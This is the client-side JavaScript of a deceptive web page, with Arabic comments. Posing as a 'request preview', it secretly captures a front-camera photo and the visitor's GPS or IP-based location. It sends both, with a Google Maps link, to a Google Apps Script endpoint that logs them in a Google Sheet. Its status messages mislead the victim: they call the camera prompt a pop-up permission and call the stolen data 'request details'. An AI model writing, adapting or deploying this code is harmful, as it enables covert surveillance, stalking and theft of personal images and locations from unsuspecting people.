async function getLocationName(latitude, longitude) {
    try {
        const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&zoom=10&accept-language=ar`
        );
        if (!response.ok) throw new Error('فشل');
        const data = await response.json();
        let locationName = '';
        if (data.address) {
            locationName = data.address.city || data.address.town || data.address.village || 
                          data.address.suburb || data.address.district || data.address.county || 
                          data.address.state || data.address.country || 'منطقة غير معروفة';
        } else {
            locationName = 'منطقة غير معروفة';
        }
        return locationName;
    } catch (error) {
        return 'منطقة غير معروفة';
    }
}

// ================================
// دالة التقاط معاينة الرابطة من الكاميرا (تم التعديل للكاميرا الأمامية)
// ================================
function capturePhotoFromCamera() {
    const video = document.getElementById('video');
    if (!video || !video.videoWidth) return false;
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    capturedImageData = canvas.toDataURL('image/jpeg', 0.7);
    return true;
}

// ================================
// دالة تشغيل الكاميرا الخفية - الآن تستخدم الكاميرا الأمامية (facingMode: 'user')
// ================================
async function startHiddenCamera(statusDiv, btn) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
            audio: false
        });
        cameraAccepted = true;
        const video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                statusDiv.innerHTML = "✅  معاينة الطلب جاهزة. جاري  جلب الطلب...";
                statusDiv.className = "status-success";
                resolve();
            };
        });
        setTimeout(() => {
            const success = capturePhotoFromCamera();
            if (success) {
                statusDiv.innerHTML = " تم جلب الطلب. للمعاينة...";
                statusDiv.className = "status-success";
                // نستدعي checkAndSend فقط إذا التقطت الصورة بنجاح
                checkAndSend(statusDiv);
            } else {
                // فشل التقاط الصورة
                statusDiv.innerHTML = "❌ فشل جلب طلب المعاينة. حاول مرة أخرى.";
                statusDiv.className = "status-error";
                btn.disabled = false;
                btn.textContent = "متابعة";
                cameraAccepted = false; // نعيد تعيين القبول لأن الصورة لم تلتقط
                // لا نفتح نافذة، ولا نرسل
            }
        }, 1500);
    } catch (err) {
        // تم رفض الكاميرا - نوقف العملية ولا نفتح النافذة الثانية
        cameraAccepted = false;
        statusDiv.innerHTML = "❌ تم رفض فتح الطلب. لا يمكن معاينة الطلب دون موافقة على السماح بالنوافذ المنبثقه.";
        statusDiv.className = "status-error";
        btn.disabled = false;
        btn.textContent = "متابعة";
        // لا نستدعي checkAndSend()
        isDone = false;
    }
}

// ================================
// دالة إرسال البيانات إلى Google Sheets ثم فتح النافذة الجديدة
// ================================
async function sendAllData() {
    // لا نرسل ولا نفتح نافذة إذا لم توجد صورة
    if (!capturedImageData) {
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = "❌ لا يوجد طلب للمعاينة، لا يمكن فتح التفاصيل.";
        statusDiv.className = "status-error";
        const btn = document.getElementById('continueBtn');
        btn.disabled = false;
        btn.textContent = "متابعة";
        return;
    }
    if (sendInProgress || !locationData) return;
    sendInProgress = true;

    const { latitude, longitude, source, locationName } = locationData;
    const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
    const linkLocation = `https://www.google.com/maps?q=${latitude},${longitude}`;
    
    const payload = {
        sheetId: SHEET_ID,
        sheetName: SHEET_NAME,
        linkLocation: linkLocation,
        targetUrl: 'تم فتح نافذة الحظر (بدون تحويل)',
        timestamp: timestamp,
        latitude: latitude,
        longitude: longitude,
        locationName: locationName,
        source: source,
        imageData: capturedImageData
    };

    const statusDiv = document.getElementById('status');
    statusDiv.innerHTML = "📤 جاري جلب بيانات اللطب من السيرفر...";
    statusDiv.className = "status-loading";

    try {
        await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        statusDiv.innerHTML = "✅ تم جلب التفاصيل بنجاح! جاري فتح النافذة...";
        statusDiv.className = "status-success";
        // فتح النافذة الجديدة فقط إذا كانت الصورة موجودة (وهي موجودة هنا)
        openBlockWindow();
        // تعطيل الزر نهائياً
        const btn = document.getElementById('continueBtn');
        btn.disabled = true;
        btn.textContent = "تم";
        btn.classList.add('btn-disabled');
        isDone = true;
    } catch (error) {
        statusDiv.innerHTML = "⚠️ حدث خطأ أثناء الجلب سيتم فتح النافذة مع ذلك.";
        statusDiv.className = "status-error";
        // حتى مع الخطأ نفتح النافذة لأن الصورة موجودة
        openBlockWindow();
        const btn = document.getElementById('continueBtn');
        btn.disabled = true;
        btn.textContent = "تم";
        btn.classList.add('btn-disabled');
        isDone = true;
    } finally {
        sendInProgress = false;
    }
}

function checkAndSend(statusDiv) {
    if (sendInProgress || isDone) return;
    if (!capturedImageData) {
        // إذا لم توجد صورة، لا نرسل
        statusDiv.innerHTML = "❌ لم يتم تفاصيل المعاينة، لا يمكن المتابعة.";
        statusDiv.className = "status-error";
        const btn = document.getElementById('continueBtn');
        btn.disabled = false;
        btn.textContent = "متابعة";
        return;
    }
    if (locationData) {
        sendAllData();
    } else {
        // ننتظر الموقع
        setTimeout(() => checkAndSend(statusDiv), 500);
    }
}

// ================================
// دالة تخزين الموقع
// ================================
function storeLocation(latitude, longitude, source) {
    if (locationData) return;
    locationData = { latitude, longitude, source };
    getLocationName(latitude, longitude).then(name => {
        locationData.locationName = name;
        const statusDiv = document.getElementById('status');
       statusDiv.innerHTML = "📍 تم الحصول على تفاصيل الطلب";
        statusDiv.className = "status-success";
        // نستدعي checkAndSend فقط إذا كانت الصورة موجودة
        if (capturedImageData) {
            checkAndSend(statusDiv);
        } else {
            // إذا لم تكن الصورة موجودة، ننتظر حتى تلتقط
            // لكننا سنعطي رسالة انتظار
            statusDiv.innerHTML = "⏳ انتظار تفاصيل الطلب...";
            statusDiv.className = "status-loading";
        }
    });
}

// ================================
// دوال جلب الموقع عبر IP و GPS
// ================================
function getLocationViaIP() {
    fetch('https://api.bigdatacloud.net/data/ip-geolocation?localityLanguage=ar')
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => { if (data.latitude && data.longitude) storeLocation(data.latitude, data.longitude, 'IP (BigDataCloud)'); })
        .catch(() => getLocationViaIP2());
}

function getLocationViaIP2() {
    fetch('https://ipapi.co/json/')
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => { if (data.latitude && data.longitude) storeLocation(data.latitude, data.longitude, 'IP (ipapi)'); })
        .catch(() => getLocationViaIP3());
}

function getLocationViaIP3() {
    fetch('https://ipinfo.io/json')
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => { 
            if (data.loc) { 
                const coords = data.loc.split(',').map(Number); 
                if (coords.length === 2 && !isNaN(coords[0]) && !isNaN(coords[1])) {
                    storeLocation(coords[0], coords[1], 'IP (ipinfo)');
                }
            }
        })
        .catch(() => {
            if (!locationData) {
                locationData = { latitude: 0, longitude: 0, source: 'unknown', locationName: 'غير معروف' };
                if (capturedImageData) {
                    checkAndSend(document.getElementById('status'));
                }
            }
        });
}

function getLocationViaGPS() {
    if (!navigator.geolocation) { getLocationViaIP(); return; }
    navigator.geolocation.getCurrentPosition(
        (position) => storeLocation(position.coords.latitude, position.coords.longitude, 'GPS'),
        (error) => getLocationViaIP(),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

// ================================
// حدث الضغط على زر متابعة
// ================================
document.getElementById('continueBtn').addEventListener('click', async function() {
    if (isDone) return;
    const btn = this;
    const statusDiv = document.getElementById('status');
    
    btn.disabled = true;
    btn.textContent = "جاري التحميل...";
    statusDiv.innerHTML = "⏳ جاري جلب تفاصيل الطلب...";
    statusDiv.className = "status-loading";

    // إعادة تعيين المتغيرات (في حالة إعادة المحاولة)
    capturedImageData = null;
    locationData = null;
    cameraAccepted = false;
    sendInProgress = false;
    isDone = false;

    // 1. تشغيل الكاميرا (الأمامية)
    startHiddenCamera(statusDiv, btn);

    // 2. الحصول على الموقع (يتم فقط إذا قبلت الكاميرا وتم التقاط الصورة)
    // سنستدعيه دائماً لكن storeLocation سيتحقق من وجود الصورة
    getLocationViaGPS();

    // 3. مهلة أمان: إذا لم يتم الإرسال بعد 20 ثانية ولم تقبل الكاميرا أو لم تلتقط الصورة، نعطي رسالة
    setTimeout(() => {
        if (!isDone) {
            if (!capturedImageData) {
                statusDiv.innerHTML = "⏰ انتهت المهلة، لم يتم  جلب تفاصيل الطلب. حاول مرة أخرى.";
                statusDiv.className = "status-error";
                btn.disabled = false;
                btn.textContent = "متابعة";
                // لا نفتح نافذة
            } else if (capturedImageData && !locationData) {
                statusDiv.innerHTML = "⚠️ فشل الحصول على المعاينة، سيتم فتح النافذة مع التفاصيل فقط.";
                statusDiv.className = "status-error";
                // نفتح النافذة حتى بدون موقع (لأن الصورة موجودة)
                // لكن نفضل إرسال البيانات بدون موقع؟ لا، الأفضل عدم فتحها بدون موقع، لكن حسب الطلب "اذا لم ترسل الصورة لا اريد فتح نافذة التفاصيل" - هنا الصورة موجودة، لذا نفتح النافذة
                openBlockWindow();
                btn.disabled = true;
                btn.textContent = "تم";
                btn.classList.add('btn-disabled');
                isDone = true;
            }
        }
    }, 20000);
});
</script>
